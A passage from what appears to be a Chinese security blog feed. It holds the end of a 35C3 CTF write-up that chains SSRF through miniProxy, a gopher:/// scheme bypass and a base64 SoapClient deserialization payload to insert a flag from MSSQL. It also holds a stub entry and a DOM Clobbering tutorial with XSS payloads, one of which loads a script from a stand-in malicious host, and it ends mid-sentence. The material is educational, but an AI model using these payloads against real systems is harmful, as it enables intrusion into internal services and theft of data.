class="string">"miniProxyFormAction"</span>];</span><br><span class="line">    <span class="keyword">unset</span>($queryParams[<span class="string">"miniProxyFormAction"</span>]);</span><br><span class="line">    $url = $formAction . <span class="string">"?"</span> . http_build_query($queryParams);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $url = substr($_SERVER[<span class="string">"REQUEST_URI"</span>], strlen($_SERVER[<span class="string">"SCRIPT_NAME"</span>]) + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在只能对miniProxy发GET请求的情况下的<code>$url</code>有两种来源方式:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> $url = $formAction . <span class="string">"?"</span> . http_build_query($queryParams);</span><br><span class="line"><span class="number">2.</span> $url = substr($_SERVER[<span class="string">"REQUEST_URI"</span>], strlen($_SERVER[<span class="string">"SCRIPT_NAME"</span>]) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>下面对<code>$url</code>进行了一些检查，只允许http和https协议</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (strpos($url, <span class="string">":/"</span>) !== strpos($url, <span class="string">"://"</span>)) &#123;</span><br><span class="line">    <span class="comment">//Work around the fact that some web servers (e.g. IIS 8.5) change double slashes appearing in the URL to a single slash.</span></span><br><span class="line">    <span class="comment">//See https://github.com/joshdick/miniProxy/pull/14</span></span><br><span class="line">    $pos = strpos($url, <span class="string">":/"</span>);</span><br><span class="line">    $url = substr_replace($url, <span class="string">"://"</span>, $pos, strlen(<span class="string">":/"</span>));</span><br><span class="line">&#125;</span><br><span class="line">$scheme = parse_url($url, PHP_URL_SCHEME);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($scheme)) &#123;</span><br><span class="line">  <span class="comment">//Assume that any supplied URLs starting with // are HTTP URLs.</span></span><br><span class="line">  <span class="keyword">if</span> (strpos($url, <span class="string">"//"</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    $url = <span class="string">"http:"</span> . $url;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!preg_match(<span class="string">"/^https?$/i"</span>, $scheme)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Error: Detected a "'</span> . $scheme . <span class="string">'" URL. miniProxy exclusively supports http[s] URLs.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码明显少处理一种情况,就是当<code>$scheme</code>为空，并且<code>$url</code>不是以<code>//</code>开头的情况。明显写代码人的认为这种情况的<code>$url</code>一定是错误的，后面调用libcurl访问这样的url一定是发送不出去请求的。</p>
<p>那有没有这样的url,是libcurl可以发送出请求的，并且经过<code>parse_url</code>处理返回的<code>$scheme</code>还是空的呢？<br>当然是有的，在这个题目<a href="https://github.com/wonderkun/CTF_web/blob/master/php4fun/challenge9.php?1547104810063" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/blob/master/php4fun/challenge9.php</a>中我们就遇到过。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">php</span> &gt; <span class="function"><span class="title">var_dump</span>(<span class="title">parse_url</span>(<span class="string">"http:///www.baidu.com"</span>));</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br></pre></td></tr></table></figure>
<p>所以可以利用<code>/miniProxy.php?gopher:///</code>来绕过协议的限制，向mssql发送数据。</p>
<h3 id="0x5-利用gopher协议打mssql"><a href="#0x5-利用gopher协议打mssql" class="headerlink" title="0x5 利用gopher协议打mssql"></a>0x5 利用gopher协议打mssql</h3><p>最后就是利用gopher来打mssql了，因为mssql的通讯协议不想自己抓了，用官方的<code>exploit.php</code>。<br>需要先找到自己的uid:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename:bootstrap.php</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>])) &#123;</span><br><span class="line">    $USER = <span class="keyword">new</span> User($_SESSION[<span class="string">"username"</span>], $_SESSION[<span class="string">"password"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_DEBUG"</span>])) var_dump($USER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>添加一个<code>DEBUG</code>头，就看到自己的uid了。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-15-52-35.png" alt="http://pic.wonderkun.cc/uploads/2019/01/2019-01-10-15-52-35.png"></p>
<p>然后构造payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php exploit.php  <span class="string">"insert into posts(userid,title,content,attachment) values (1,\"test\",(select flag</span></span><br><span class="line"><span class="string">from flag.flag),\"test\");"</span></span><br><span class="line"></span><br><span class="line">JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2x</span><br><span class="line">vY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdX</span><br><span class="line">Nlcl9hZ2VudCI7czoxMzQ5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJ</span><br><span class="line">TAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAy</span><br><span class="line">JTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTA</span><br><span class="line">wJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMC</span><br><span class="line">VBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwM</span><br><span class="line">CUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDBy</span><br><span class="line">JTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDB</span><br><span class="line">jJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMS</span><br><span class="line">UwMSUwMCVGQyUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwc</span><br><span class="line">yUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUy</span><br><span class="line">QyUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTA</span><br><span class="line">wbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAxJTAwJTJDJTAwJTIyJTAwdCUwMGUlMDBzJTAwdCUwMCUyMiUwMC</span><br><span class="line">UyQyUwMCUyOCUwMHMlMDBlJTAwbCUwMGUlMDBjJTAwdCUwMCUyMCUwMGYlMDBsJTAwYSUwMGclMDAlMjAlMDBmJTAwciUwMG8lMDBtJTAwJTIwJTAwZiUwMGwlMDBhJ</span><br><span class="line">TAwZyUwMC4lMDBmJTAwbCUwMGElMDBnJTAwJTI5JTAwJTJDJTAwJTIyJTAwdCUwMGUlMDBzJTAwdCUwMCUyMiUwMCUyOSUwMCUzQiUwMCUzQiUwMC0lMDAtJTAwJTIw</span><br><span class="line">JTAwLSUwMCBIVFRQLzEuMQpIb3N0OiBsb2NhbGhvc3QKCiI7fX0=</span><br></pre></td></tr></table></figure>

<p>用python发送这个base64解码之后的content,就可以打到flag了。</p>
<p>去年34c3CTF的时候出SSRF打mysql，35c3CTF的时候出SSRF打sql server 。c3CTF真是太真实了，大胆猜一下，明年打哪个数据库？  </p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-21551内核提取漏洞学习</title>
    <url>/2021/05/24/CVE-2021-21551%E5%86%85%E6%A0%B8%E6%8F%90%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><strong>先占坑，防止我日后偷懒又不学了</strong></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM Clobbering Attack学习记录.md</title>
    <url>/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>很早就提出的攻击技巧了，都差不多忘记了，再拿出来复习复习。</p>
<a id="more"></a>

<h3 id="0x1-DOM-Clobbering入门"><a href="#0x1-DOM-Clobbering入门" class="headerlink" title="0x1 DOM Clobbering入门"></a>0x1 DOM Clobbering入门</h3><p>之前在文章《前端中存在的变量劫持漏洞》中对id已经有了一些认识，我们知道有如下知识：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>想在javascript中通过获取到此dom节点，出来使用<code>document.getElementById(&#39;username&#39;)</code>和<code>document.querySelector(&#39;#username&#39;)</code>之外还可以直接使用<code>window.username</code>来获取。</p>
<p>这个特性就被称为<code>DOM Cloberring</code>,可以造成很多有意思的漏洞，比如当程序依赖某些全局变量是否存在做某些分支跳转的时候：<code>if(window.isAdmin){ ... }</code>.</p>
<p>为了分析<code>DOM Clobbering</code>漏洞，假设我们有如下的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.test1.test2) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">''</span>+<span class="built_in">window</span>.test1.test2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想利用<code>Dom Clobbering</code>技巧来执行任意的js，首先需要解决两个问题。</p>
<ol>
<li>利用id，很容易在window对象上创建任意属性，但是我们能在新对象上创建新的属性吗？类似于(test1.test2)</li>
<li>怎么控制 DOM elements被强制类型转换为string之后的值，大多数的dom节点被转换为stirng之后，都会返回<code>[object HTMLInputElement]</code></li>
</ol>
<p>为了解决第一个问题，我们很容易就想到<code>&lt;form&gt;</code>标签，因为每一个<code>&lt;input&gt;</code>标签的都会添加为它之上的<code>&lt;form&gt;</code>标签的属性，属性的名字就是<code>&lt;input&gt;</code>标签中声明的<code>name</code>属性，下面举一个例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  alert(test1.test2); <span class="comment">// alerts "[object HTMLInputElement]"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了解决第二个问题，我们用一段小代码HTML可能存在的所有标签，然后check对应的dom节点对象有没有实现<code>toString</code>方法，或者直接继承于<code>Object.prototype</code>。如果是继承自<code>Object.prototype</code>,那么很有可能只会返回<code>[object SomeElement]</code>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>

<p>执行完成后会返回两个属性,<code>HTMLAreaElement</code> (<code>&lt;area&gt;</code>) and <code>HTMLAnchorElement</code> (<code>&lt;a&gt;</code>),下面只说一下<code>&lt;a&gt;</code>标签吧（<code>&lt;area&gt;</code>标签类似）。<code>&lt;a&gt;</code>标签的<code>toString</code>会直接返回它的<code>href</code>属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">https://securitum.com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  alert(test1); <span class="comment">// alerts "https://securitum.com"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时把上面的两个问题放到一块解决，可能会想出这样的方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是并不行，<code>test1.test2</code>是<code>undefined</code>,因为<code>&lt;input&gt;</code>元素会变成<code>&lt;form&gt;</code>的属性，但是<code>&lt;a&gt;</code>标签并不会。</p>
<p>解决这个问题有个很有意思的方法，就是定义两个元素拥有一样的id：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我预期的是<code>window.test</code>会返回第一个<code>&lt;a&gt;</code>标签(因为<code>document.getElementById(&#39;#test1&#39;)</code>就会返回第一个)，但是确实一个HTMLCollection</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&gt;window.test1</span><br><span class="line">&lt;HTMLCollection(<span class="number">2</span>) [<span class="keyword">a</span><span class="comment">#test1, a#test1, test1: a#test1]</span></span><br><span class="line"><span class="built_in">length</span>: <span class="number">2</span></span><br><span class="line"><span class="number">0</span>: <span class="keyword">a</span><span class="comment">#test1</span></span><br><span class="line"><span class="number">1</span>: <span class="keyword">a</span><span class="comment">#test1</span></span><br><span class="line">test1: <span class="keyword">a</span><span class="comment">#test1</span></span><br><span class="line">__proto__: HTMLCollection</span><br></pre></td></tr></table></figure>

<p>这里就有一个很有意思的点，<code>HTMLCollection</code>可以使用index进行访问，同时可以使用id访问，也就是<code>window.test1.test1</code>获取到的就是第一个元素。事实证明name属性也会直接注册为<code>HTMLCollection</code>的属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span>click!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span>click2!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&gt; window.test1</span><br><span class="line">&lt; HTMLCollection(<span class="number">2</span>) [<span class="keyword">a</span><span class="comment">#test1, a#test1, test1: a#test1, test2: a#test1]length: 20: a#test11: a#test1test1: a#test1test2: a#test1__proto__: HTMLCollection</span></span><br><span class="line">&gt; window.test1.test2</span><br><span class="line">&lt;<span class="keyword">a</span> id=<span class="string">"test1"</span> name=<span class="string">"test2"</span>&gt;click2!&lt;/<span class="keyword">a</span>&gt;</span><br></pre></td></tr></table></figure>

<p>所以我们就可以利用下面的方法轻松解决之前的<code>eval(&#39;&#39;+window.test1.test2)</code>的问题了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"test1"</span> <span class="attr">name</span>=<span class="string">"test2"</span> <span class="attr">href</span>=<span class="string">"x:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x2-一个简单的练习"><a href="#0x2-一个简单的练习" class="headerlink" title="0x2 一个简单的练习"></a>0x2 一个简单的练习</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> someObject = <span class="built_in">window</span>.someObject || &#123;&#125;;</span><br><span class="line">    <span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    script.src = someObject.url;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line"> &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了利用这个漏洞，只需要向html中添加如下内容就可以了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">someObject</span> <span class="attr">name</span>=<span class="string">url</span> <span class="attr">href</span>=<span class="string">//malicious-website.com/malicious.js</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x3-进阶"><a href="#0x3-进阶" class="headerlink" title="0x3 进阶"></a>0x3 进阶</h3><p>找出所有id具有父子依赖关系的节点。实现代码很简单，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">var</span> log=[];</span><br><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;html.length;i++) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;html.length;j++) &#123;</span><br><span class="line">    div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">       log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>最后的输出是:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">form</span>,button</span><br><span class="line"><span class="selector-tag">form</span>,fieldset</span><br><span class="line"><span class="selector-tag">form</span>,image</span><br><span class="line"><span class="selector-tag">form</span>,img</span><br><span class="line"><span class="selector-tag">form</span>,input</span><br><span class="line"><span class="selector-tag">form</span>,object</span><br><span class="line"><span class="selector-tag">form</span>,output</span><br><span class="line"><span class="selector-tag">form</span>,select</span><br><span class="line"><span class="selector-tag">form</span>,textarea</span><br></pre></td></tr></table></figure>

<p>所以向要生成<code>x.y.value</code>可以使用如下的方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">output</span> <span class="attr">id</span>=<span class="string">y</span>&gt;</span>I've been clobbered<span class="tag">&lt;/<span class="name">output</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用form标签可以来伪造三层的对象引用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">name</span>=<span class="string">y</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">z</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(x.y.z)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当form标签有两个一样的id的input标签的的时候，chrome会把input标签处理成为<code>[object RadioNodeList]</code>,这个对象有类似于数组的方法如forEach：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">y</span> <span class="attr">name</span>=<span class="string">z</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">y</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">x.y.forEach(<span class="function"><span class="params">element</span>=&gt;</span>alert(element))</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为只有html规范中定义的属性才能注册为dom节点的属性，下面的例子就可以说明。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">y</span>=<span class="string">123</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">alert(x.y)<span class="comment">//undefined ， y不是html规范定义的form的属性。</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以我们可以利用如下的代码来看一下我们都有哪些可以用的属性：</p>
